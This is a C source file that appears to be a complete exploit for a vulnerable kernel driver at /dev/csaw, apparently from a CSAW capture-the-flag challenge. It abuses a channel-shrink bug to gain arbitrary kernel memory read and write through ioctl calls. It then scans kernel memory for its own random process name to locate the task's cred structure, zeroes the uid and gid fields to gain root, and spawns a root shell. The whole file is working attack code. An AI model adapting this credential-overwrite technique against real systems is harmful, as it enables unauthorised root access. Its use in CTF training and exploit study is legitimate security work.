#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>

#define PAGE_SIZE getpagesize()
#define PAGE_OFFSET 0xffff880000000000
#define BUF_SIZE PAGE_SIZE

#define TASK_COMM_LEN 16

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8

struct alloc_channel_args {
    size_t buf_size;
    int id;
};

struct open_channel_args {
    int id;
};

struct grow_channel_args {
    int id;
    size_t size;
};

struct shrink_channel_args {
    int id;
    size_t size;
};

struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};

struct close_channel_args {
    int id;
};

void error ( char *msg )
{
	perror(msg);
	exit(EXIT_FAILURE);
}

void hexdump ( char *addr, unsigned int length )
{
	unsigned int i, j;

	for ( i = 0; i < length / 16; i++ )
	{
		for ( j = 0; j < 16; j++ )
		{
			printf("%02hhx ", addr[i * 16 + j]);
		}
		printf("\n");
	}
}

int read_kernel_memory ( int fd, int id, unsigned long kaddr, void *buf, unsigned int size )
{
    int ret;
	struct seek_channel_args seek_channel;
	struct read_channel_args read_channel;

	memset(&seek_channel, 0, sizeof(seek_channel));
	seek_channel.id = id;
	seek_channel.index = kaddr - 0x10;
	seek_channel.whence = SEEK_SET;

	ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

	memset(&read_channel, 0, sizeof(read_channel));
	read_channel.id = id;
	read_channel.buf = buf;
	read_channel.count = size;

	ret = ioctl(fd, CSAW_READ_CHANNEL, &read_channel);

    return ret;
}

int write_kernel_null_byte ( int fd, int id, unsigned long kaddr )
{
    int ret;
    char null_byte = 0;
	struct seek_channel_args seek_channel;
	struct write_channel_args write_channel;

    /*
     * The write primitive uses strncpy_from_user(), so we can't write full
     * dwords containing a null terminator. The exploit only needs to write
     * zeroes anyhow, so this function just passes a single null byte.
     */

	memset(&seek_channel, 0, sizeof(seek_channel));
	seek_channel.id = id;
	seek_channel.index = kaddr - 0x10;
	seek_channel.whence = SEEK_SET;

	ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

	memset(&write_channel, 0, sizeof(write_channel));
	write_channel.id = id;
	write_channel.buf = &null_byte;
	write_channel.count = sizeof(null_byte);

	ret = ioctl(fd, CSAW_WRITE_CHANNEL, &write_channel);

    return ret;
}

void escalate_creds ( int fd, int id, unsigned long cred_kaddr )
{
    unsigned int i;
    unsigned long tmp_kaddr;

    /*
     * The cred struct looks like:
     *
     *     atomic_t    usage;
     *     kuid_t      uid;
     *     kgid_t      gid;
     *     kuid_t      suid;
     *     kgid_t      sgid;
     *     kuid_t      euid;
     *     kgid_t      egid;
     *     kuid_t      fsuid;
     *     kgid_t      fsgid;
     *
     * where each field is a 32-bit dword.  Skip the first field and write
     * zeroes over the id fields to escalate to root.
     */

    /* Skip usage field */

    tmp_kaddr = cred_kaddr + sizeof(int);

    /* Now overwrite the id fields */

    for ( i = 0; i < (sizeof(int) * 8); i++ )
        write_kernel_null_byte(fd, id, tmp_kaddr + i);
}

void gen_rand_str ( char *str, unsigned int len )
{
    unsigned int i;

    for ( i = 0; i < (len - 1); i++ )
        str[i] = (rand() % (0x7e - 0x20)) + 0x20;

    str[len - 1] = 0;
}

int main ( int argc, char **argv )
{
	int ret, fd, id;
    unsigned long offset;
	char *addr, *ceiling;
	struct alloc_channel_args alloc_channel;
	struct shrink_channel_args shrink_channel;
	char comm[TASK_COMM_LEN];

    /* Set comm to random signature */

    srand(time(NULL));

    gen_rand_str(comm, sizeof(comm));

    printf("Generated comm signature: '%s'\n", comm);

    ret = prctl(PR_SET_NAME, comm);
    if ( ret < 0 )
        error("prctl");

    /* Open device */

	fd = open("/dev/csaw", O_RDONLY);
	if ( fd < 0 )
		error("open");

    /* Allocate IPC channel */

	memset(&alloc_channel, 0, sizeof(alloc_channel));
	alloc_channel.buf_size = 1;

	ret = ioctl(fd, CSAW_ALLOC_CHANNEL, &alloc_channel);
	if ( ret < 0 )
		error("ioctl");

    id = alloc_channel.id;

	printf("Allocated channel id %d\n", id);

    /* Shrink channel to -1 */

	memset(&shrink_channel, 0, sizeof(shrink_channel));
	shrink_channel.id = id;
	shrink_channel.size = 2;

	ret = ioctl(fd, CSAW_SHRINK_CHANNEL, &shrink_channel);
	if ( ret < 0 )
		error("ioctl");

	printf("Shrank channel to -1 bytes\n");

    /* Map buffer for leaking kernel memory to */

	addr = (char *)mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
	if ( addr == MAP_FAILED )
		error("mmap");

    ceiling = addr + BUF_SIZE;

    printf("Mapped buffer %p:0x%x\n", addr, BUF_SIZE);

    printf("Scanning kernel memory for comm signature...\n");

    /*
     * We escalate to root by modifying our cred struct in memory.  We first
     * find it by leaking kernel memory one chunk at a time and applying a
     * simple heuristic.
     *
     * Pointers to our creds reside next to the user-controllable comm field in
     * task_struct:
     *
     *     const struct cred __rcu *real_cred;
     *     const struct cred __rcu *cred;
     *     char comm[TASK_COMM_LEN];
     *
     * Scan memory for our unique comm string, then verify that the two prior
     * qwords look like kernel pointers.
     */

    offset = 0;

    while ( 1 )
    {
        unsigned long kernel_addr = PAGE_OFFSET + offset;
        unsigned long *search;

        /* If kernel_addr wraps, we failed to find the comm signature */

        if ( kernel_addr < PAGE_OFFSET )
        {
            printf("Failed to find comm signature in memory!\n");
            exit(EXIT_FAILURE);
        }

        /* Leak one chunk of kernel memory to userland */

        ret = read_kernel_memory(fd, id, kernel_addr, addr, BUF_SIZE);
        if ( ret < 0 )
        {
            offset += BUF_SIZE;
            continue;
        }

        /* Scan for the comm signature in chunk */

        search = (unsigned long *)addr;

        while ( (unsigned long)search < (unsigned long)ceiling )
        {
            search = memmem(search, (unsigned long)ceiling - (unsigned long)search, comm, sizeof(comm));

            if ( search == NULL )
                break;

            if ( (search[-2] > PAGE_OFFSET) && (search[-1] > PAGE_OFFSET ) )
            {
                unsigned long real_cred, cred;

                real_cred = search[-2];
                cred = search[-1];

                printf("Found comm signature at %p\n", (void *)(kernel_addr + ((char *)search - addr)));
	            printf("read_cred = %p\n", (void *)real_cred);
            	printf("cred = %p\n", (void *)cred);

                escalate_creds(fd, id, real_cred);

                if ( cred != real_cred )
                    escalate_creds(fd, id, cred);

                goto GOT_ROOT;
            }

            search = (unsigned long *)((char *)search + sizeof(comm));
        }

        offset += BUF_SIZE;
    }

GOT_ROOT:
    if ( getuid() != 0 )
    {
        printf("Attempted to escalate privileges, but failed to get root\n");
        exit(EXIT_FAILURE);
    }

    printf("Got root! Enjoy your shell...\n");

    execl("/bin/sh", "sh", NULL);

	return 0;
}
